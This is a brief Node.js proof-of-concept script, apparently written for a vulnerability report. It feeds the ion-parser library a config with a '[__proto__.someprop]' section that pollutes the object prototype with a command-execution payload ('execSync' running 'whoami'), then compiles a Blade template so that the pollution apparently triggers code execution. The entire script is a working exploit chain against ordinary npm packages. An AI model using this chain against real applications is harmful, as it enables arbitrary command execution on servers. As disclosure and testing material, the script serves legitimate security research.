const blade = require('blade');
const { parse } = require('ion-parser')
const config = parse(`
test = 'Hey universe'

[__proto__.someprop]
name = "somename"
value = "somevalue"
code = "process.mainModule.require('child_process').execSync(\`whoami\`)"
`)
console.log(config)

const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;
blade.compile(template, {'debug': true}, function(err, tmpl) {
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});